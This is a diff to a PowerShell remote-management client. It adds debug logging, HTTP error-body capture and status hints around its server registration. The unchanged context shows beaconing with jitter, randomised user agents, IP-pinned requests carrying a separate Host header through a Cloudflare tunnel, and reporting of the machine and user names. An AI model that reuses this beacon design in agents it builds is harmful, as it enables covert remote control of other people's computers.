@@ -26,6 +26,94 @@ if ($env:RMM_BEACON_SECRET -and $env:RMM_BEACON_SECRET.Trim().Length -gt 0) {
     $beaconSecret = $env:RMM_BEACON_SECRET.Trim()
 }
 
+# Verbose HTTP logs: set RMM_VERBOSE=1 (URL, wire IPv4, status codes, error bodies).
+$script:RmmVerbose = $false
+if ($env:RMM_VERBOSE -and $env:RMM_VERBOSE.Trim() -match '^(?i)(1|true|yes|on)$') {
+    $script:RmmVerbose = $true
+}
+
+function Write-RmmLog {
+    param(
+        [Parameter(Mandatory = $true)][string]$Message,
+        [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO'
+    )
+    if ($Level -eq 'DEBUG' -and -not $script:RmmVerbose) { return }
+    $color = switch ($Level) {
+        'WARN'  { 'Yellow' }
+        'ERROR' { 'Red' }
+        'DEBUG' { 'DarkGray' }
+        default { 'Gray' }
+    }
+    $prefix = switch ($Level) {
+        'DEBUG' { '[dbg]' }
+        'WARN'  { '[!]' }
+        'ERROR' { '[-]' }
+        default { '[*]' }
+    }
+    Write-Host "$prefix $Message" -ForegroundColor $color
+}
+
+function Get-RmmHttpErrorBody {
+    param([System.Net.HttpWebResponse]$Response)
+    if (-not $Response) { return '' }
+    try {
+        $stream = $Response.GetResponseStream()
+        if (-not $stream) { return '' }
+        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
+        $text = $reader.ReadToEnd()
+        $reader.Close()
+        try { $Response.Close() } catch {}
+        return ([string]$text).Trim()
+    } catch {
+        return ''
+    }
+}
+
+function Get-RmmHttpStatusHint {
+    param([int]$StatusCode)
+    switch ($StatusCode) {
+        401 { return 'Unauthorized — wrong or missing X-RMM-Beacon-Token (RMM_BEACON_SECRET).' }
+        403 { return 'Forbidden — session killed or beacon secret rejected.' }
+        404 { return 'Not found — check RMM_BASE_URL path.' }
+        502 { return 'Bad gateway — tunnel/origin down (is cloudflared + server_rmm.py running?).' }
+        503 { return 'Service unavailable — origin not ready.' }
+        524 { return 'Cloudflare timeout — origin did not answer in time (cloudflared cannot reach server_rmm.py on 127.0.0.1:8080?).' }
+        default { return '' }
+    }
+}
+
+function Write-RmmHttpFailure {
+    param(
+        [Parameter(Mandatory = $true)]$ErrorRecord,
+        [string]$Context = ''
+    )
+    $ex = $ErrorRecord.Exception
+    if ($ex.InnerException -is [System.Net.WebException]) {
+        $ex = $ex.InnerException
+    }
+    $status = 0
+    $body = ''
+    if ($ex -is [System.Net.WebException] -and $ex.Response) {
+        $status = [int]$ex.Response.StatusCode
+        $body = Get-RmmHttpErrorBody -Response $ex.Response
+    }
+    $head = if ($Context) { "$Context — " } else { '' }
+    if ($status -gt 0) {
+        Write-RmmLog ("{0}HTTP {1} ({2})" -f $head, $status, $ex.Message) -Level ERROR
+        $hint = Get-RmmHttpStatusHint -StatusCode $status
+        if ($hint) { Write-RmmLog $hint -Level WARN }
+    } else {
+        Write-RmmLog ("{0}{1}" -f $head, $ex.Message) -Level ERROR
+    }
+    if ($body) {
+        $preview = if ($body.Length -gt 300) { $body.Substring(0, 300) + '...' } else { $body }
+        Write-RmmLog "Response body: $preview" -Level DEBUG
+    }
+    if ($status -eq 0 -and $ex.Message -match 'actively refused') {
+        Write-RmmLog "Nothing listening at that host:port on this machine. Start server_rmm.py or fix RMM_BASE_URL." -Level WARN
+    }
+}
+
 function Get-RmmRequestHeaders {
     param([string]$UserAgent = (Get-RandomUserAgent))
     $h = @{
@@ -143,6 +231,8 @@ function Invoke-RmmRestMethod {
     $builder.Host = $resolved.Ipv4.ToString()
     $wireUri = $builder.Uri
 
+    Write-RmmLog "$Method $origUri -> wire $($resolved.Ipv4) Host=$($resolved.OriginalHost) KeepAlive=$($script:UsePersistentHttp)" -Level DEBUG
+
     $req = [System.Net.HttpWebRequest]::Create($wireUri)
     $req.Method = $Method
     $req.Host = $resolved.OriginalHost
@@ -198,15 +288,17 @@ function Invoke-RmmRestMethod {
         $http = [System.Net.HttpWebResponse]$response
         $statusNum = [int]$http.StatusCode
         if ($statusNum -ge 400) {
-            try {
-                $es = $http.GetResponseStream()
-                $er = New-Object System.IO.StreamReader($es, [System.Text.Encoding]::UTF8)
-                $null = $er.ReadToEnd()
-                $er.Close()
-            } catch {
+            $errBody = Get-RmmHttpErrorBody -Response $http
+            $hint = Get-RmmHttpStatusHint -StatusCode $statusNum
+            $msg = "The remote server returned an error: ($statusNum) $($http.StatusCode)."
+            if ($hint) { $msg += " $hint" }
+            if ($errBody) {
+                $prev = if ($errBody.Length -gt 200) { $errBody.Substring(0, 200) + '...' } else { $errBody }
+                $msg += " Body: $prev"
             }
+            Write-RmmLog "HTTP $statusNum on $Method $origUri — $msg" -Level ERROR
             throw [System.Net.WebException]::new(
-                "The remote server returned an error: ($statusNum) $($http.StatusCode).",
+                $msg,
                 $null,
                 [System.Net.WebExceptionStatus]::ProtocolError,
                 $http)
@@ -217,24 +309,38 @@ function Invoke-RmmRestMethod {
         $reader.Close()
         $ctOut = $http.ContentType
         $http.Close()
+        Write-RmmLog "HTTP $statusNum $Method $origUri ($($raw.Length) bytes)" -Level DEBUG
         return (Convert-RmmHttpResponseContent -Raw $raw -ContentType $ctOut)
     } catch [System.Net.WebException] {
         $we = $_.Exception
-        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
-            if ($we.Response) {
-                try {
-                    $errs = $we.Response.GetResponseStream()
-                    $edr = New-Object System.IO.StreamReader($errs, [System.Text.Encoding]::UTF8)
-                    $null = $edr.ReadToEnd()
-                    $edr.Close()
-                } catch {
-                }
-                try { $we.Response.Close() } catch {
-                }
+        $eb = ''
+        if ($we.Response) {
+            $st = [int]$we.Response.StatusCode
+            Write-RmmLog "WebException HTTP $st on $Method $origUri — $($we.Message)" -Level ERROR
+            $hint = Get-RmmHttpStatusHint -StatusCode $st
+            if ($hint) { Write-RmmLog $hint -Level WARN }
+            $eb = Get-RmmHttpErrorBody -Response $we.Response
+            if ($eb) {
+                $pv = if ($eb.Length -gt 300) { $eb.Substring(0, 300) + '...' } else { $eb }
+                Write-RmmLog "Response body: $pv" -Level DEBUG
             }
+        } else {
+            Write-RmmLog "WebException on $Method $origUri — $($we.Message)" -Level ERROR
+        }
+        $enriched = $we.Message
+        if ($we.Response) {
+            $st = [int]$we.Response.StatusCode
+            $hint = Get-RmmHttpStatusHint -StatusCode $st
+            if ($hint) { $enriched += " $hint" }
+        }
+        if ($eb) {
+            $prev = if ($eb.Length -gt 200) { $eb.Substring(0, 200) + '...' } else { $eb }
+            $enriched += " Body: $prev"
+        }
+        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
             return $null
         }
-        throw $we
+        throw [System.Exception]::new($enriched, $we)
     } catch {
         if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
             return $null
@@ -565,6 +671,17 @@ $registered = $false
 $retryCount = 0
 
 Write-Host "[*] Starting RMM client with Session ID: $sessionId" -ForegroundColor Cyan
+Write-Host "[*] Server URL: $u" -ForegroundColor Cyan
+if ($beaconSecret) {
+    Write-Host "[*] Beacon token: set (RMM_BEACON_SECRET)" -ForegroundColor Cyan
+} else {
+    Write-Host "[!] Beacon token: NOT set — server will reject unless started with --insecure" -ForegroundColor Yellow
+}
+if ($script:RmmVerbose) {
+    Write-Host "[*] Verbose HTTP logging enabled (RMM_VERBOSE=1)" -ForegroundColor DarkGray
+} else {
+    Write-Host "[*] Tip: set RMM_VERBOSE=1 for per-request URL, wire IP, and error bodies" -ForegroundColor DarkGray
+}
 Write-Host "[*] Default beacon: $baseSleepSeconds seconds with $jitterPercent% jitter" -ForegroundColor Cyan
 if ($script:UsePersistentHttp) {
     Write-Host "[*] HTTP: persistent cookies + TCP keep-alive. IPv4-only. Clear RMM_PERSISTENT_HTTP / set `$persistentHttp = `$false` for default." -ForegroundColor DarkGray
@@ -576,7 +693,8 @@ while (-not $registered -and $retryCount -lt $maxRetries) {
     try {
         $registerUrl = "$u/register?id=$sessionId&h=$computerName&u=$userName"
         $headers = Get-RmmRequestHeaders
-        
+        Write-RmmLog "Register GET $registerUrl (beacon=$([bool]$beaconSecret))" -Level DEBUG
+
         $response = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
         Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
         $registered = $true
@@ -585,6 +703,9 @@ while (-not $registered -and $retryCount -lt $maxRetries) {
         $forbidden = $false
         try {
             $resp = $_.Exception.Response
+            if (-not $resp -and $_.Exception.InnerException) {
+                $resp = $_.Exception.InnerException.Response
+            }
             if ($resp -and [int]$resp.StatusCode -eq 403) { $forbidden = $true }
         } catch {}
         if ($forbidden) {
@@ -592,7 +713,8 @@ while (-not $registered -and $retryCount -lt $maxRetries) {
             exit 0
         }
         $retryCount++
-        Write-Host "[-] Registration failed (attempt $retryCount/$maxRetries): $_" -ForegroundColor Red
+        Write-Host "[-] Registration failed (attempt $retryCount/$maxRetries): $($_.Exception.Message)" -ForegroundColor Red
+        Write-RmmHttpFailure -ErrorRecord $_ -Context "register"
         if ($retryCount -lt $maxRetries) {
             $backoffTime = Get-BackoffSleep -retryCount $retryCount
             Write-Host "[*] Retrying in $backoffTime seconds..." -ForegroundColor Yellow
